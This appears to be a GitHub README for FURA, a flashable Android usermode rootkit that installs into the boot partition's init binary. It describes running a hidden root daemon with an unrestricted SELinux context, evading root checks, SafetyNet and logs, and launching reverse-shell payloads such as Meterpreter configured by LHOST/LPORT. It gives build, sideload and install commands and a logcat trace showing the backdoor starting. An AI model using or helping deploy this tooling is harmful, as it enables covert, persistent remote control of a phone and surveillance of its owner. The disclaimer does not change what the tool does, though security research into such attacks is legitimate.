# Flashable Usermode Rootkit for Android

#### A full rework of [unlocked-bootloader-backdoor-demo](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo) by LuigiVampa92

#### This is currently an experimental work. Stability is not guaranteed.

FURA is a systemless flashable backdoor installed into boot partition, particularly into _init_ binary.
On boot, it launches a system daemon with root privileges and unrestricted SELinux context, which is also hidden from process list.
Since it's operating within ramdisk, this tool can bypass most root checks, integrity checks, etc. and presumably cannot be detected without root _(not even by ADB shell)_.

Unlike its predecessor, this rootkit can bypass SafetyNet, since it doesn't need to modify system partition. \
However, it can't bypass hardware checks, such as hardware-backed SafetyNet on newer devices. 

The daemon launches arbitrary executable in loop, while providing cover and execution control. 
It runs silently and normally leaves no traces in _dmesg_, _logcat_, etc., unlike regular services run by _init_ in loop.

FURA uses SELinux to its own advantage: not only to bypass stock policy restrictions, but to hide itself from the rest of the system.

This tool, like its predecessor, is based on [Magisk](https://github.com/topjohnwu/Magisk) source code, but does not necessary require root or Magisk preinstalled on the device. 
It mostly uses a part of MagiskInit to patch SELinux policies.

#### Tested on:

OS | Android | Boot scheme
---|---|---
MIUI 11.0.2 | 7 | rootfs
LineageOS 17.1 | 10 | 2SI
LineageOS 19.0 | 12 | 2SI

## Features & Improvements

- Installs entirely into _/boot_, does not modify _/system_ in any way
- Operates in ramdisk without touching storage
- Employs a custom daemon to monitor payload execution
- Modifies SELinux policy to hide itself
- Installation and backup no longer depend on _/data_
- Installation takes much less time
- Cut artifacts and unused code left from Magisk

## Limitations
- Incompatible with Magisk, causing bootloop
- Not hidden from root (files, mounts, etc.)
- On some systems _logcat_ may log random service name on boot
- Sockets (if any) are not hidden, though specific process using network is

## Prerequisites

- Python 3
- Android SDK
- ADB / Fastboot tools
- Custom recovery image for your device (TWRP is recommended)
- #### **No Magisk installed on device!** &ensp; (compatibility issues cause bootloop)

## Build

_cd_ into main project directory.

Set ANDROID_SDK_ROOT variable in your shell. For example:  
```
$ export ANDROID_SDK_ROOT=/opt/android-sdk
```

Install and configure NDK:
```
$ ./build_revshell.py ndk
```

Run the build script:
```
$ ./build_revshell.py clean      # before rebuild if changed config
$ ./build_revshell.py
```

The result is a sideloadable _.zip_ package which can be installed with TWRP or other recovery.

_Note_: if using reverse shell payloads (such as ReverseSSH, Meterpreter, etc.), set your LHOST and LPORT in `config.prop` before building.

_Note_: if SELinux is _permissive_ or _off_ on the target device, you can use alternative hiding method. See `config.prop` for details.

_Note_: you can disable logging (logcat and selinux) by setting `release=True` in the end of `build_revshell.py`.


## Deploy

#### Install

Run TWRP on your device:
```
$ fastboot boot twrp.img
```

Start sideload feature in Advanced / Sideload and then run:
```
$ adb sideload zip_reverse_shell_v2.zip
```

At this moment, **do not reboot** right away. Backup original boot partition:
```
$ adb pull /tmp/backup_original_partitions .
```

Run the command **before** rebooting into system, otherwise you will not be able to uninstall this tool properly and will have to find stock boot image for your device somewhere and flash it.

Reboot into system after you have backups on your PC.

#### Uninstall

You need a backup of original partitions made during installation. Move it to _/tmp_:
```
$ adb push backup_original_partitions /tmp/
```

Start sideload feature in Advanced / Sideload and then run:
```
$ adb sideload zip_reverse_shell_uninstall.zip
```

Reboot into system.

... or you can just flash stock boot image if you have one:
```
$ fastboot flash boot boot.img
```

#### Installation scripts

There are installation scripts to automate install / reinstall process. \
Before running one, rename or symlink your TWRP image as `twrp` in your current directory.

Simply connect your device via USB and switch it into Fastboot mode.
After installation, backups will be saved automatically.

`install.sh` to install and save backup image. \
`reinstall.sh` to reinstall quickly (if you have the backup).\
`uninstall.sh` to restore original boot image from backup.

#### In case installation script crashes, make sure you pull backups manually when prompted!

#### _Warning_: avoid double installation as it will cause bootloop! Reinstall (uninstall and install again) instead.

## Test

The default payload in this repo is a dummy program that writes stuff to logcat. 

After boot is completed, you should be able to see its output:

```
$ adb logcat | grep revshell
03-18 00:34:41.732  2381  2381 D revshell_exec: Remounting /sbin to avoid mount detection ...
03-18 00:34:41.732  2381  2381 D revshell_exec: Setting up /mnt/secure/temp
03-18 00:34:41.732  2381  2381 D revshell_exec: Awaiting decryption ...
03-18 00:34:41.732  2381  2381 D revshell_exec: Decrypted. Setting persistence dir at /data/adb/.aura
03-18 00:34:46.817  2381  2381 I revshell_exec: restarting ...
03-18 00:34:46.884  3197  3197 D revshell: Start successfull!
03-18 00:34:46.885  3197  3197 D revshell: Signals are set to ignore
03-18 00:34:46.885  3197  3197 D revshell: Hey I'm a revshell process!
03-18 00:34:46.885  3197  3197 D revshell: My PID -- 3197
03-18 00:34:46.885  3197  3197 D revshell: My parent PID -- 2381
03-18 00:34:46.885  3197  3197 D revshell: My UID -- 0
03-18 00:34:46.885  3197  3197 D revshell: Awaiting encrypted FS decryption now...
03-18 00:34:51.241  2381  2381 D revshell_exec: Checking PID
03-18 00:34:51.311  3197  3197 D revshell: FS has been decrypted!
03-18 00:34:51.311  3197  3197 D revshell: Starting reverse shell now
03-18 00:34:56.242  2381  2381 D revshell_exec: Checking PID
03-18 00:34:56.312  3197  3197 D revshell: tick ! 10 seconds since process started
03-18 00:35:01.244  2381  2381 D revshell_exec: Checking PID
03-18 00:35:01.312  3197  3197 D revshell: tick ! 15 seconds since process started
```

You can disable logging (logcat and selinux) by setting `release=True` in the end of `build_revshell.py`.

## Custom payloads

To embed a custom payload, simply put your executable into `revshell/{arch}/` as `revshell`. It is not required to place executables for all archs: those where `revshell` is absent will use default payload. 

For more details on custom payloads, see [Payloads](revshell/Payloads.md).


## Acknowledgments

Thanks to LuigiVampa92 for a [great article](https://habr.com/ru/articles/541190/) on a physical access attack concept for devices with unlocked bootloader.

Thanks to topjohnwu and all Magisk maintainers for that brilliant swiss army knife for Android and a great contribution to Android modding community.

## Links

[Magisk](https://github.com/topjohnwu/Magisk) \
[unlocked-bootloader-backdoor-demo](https://github.com/LuigiVampa92/unlocked-bootloader-backdoor-demo)


## Disclaimer
    
    This tool is designed for educational purposes only. You may utilize this software solely 
    on your personal devices. Any attempt to use it on a device without explicit authorization 
    is unethical and may violate privacy laws.
    
    Using this software may result in bricking or damaging your device. Create a backup of your 
    data and stock ROM before using it.
    
    Use at your own risk. Developer is not responsible for any damage or loss caused by this tool.
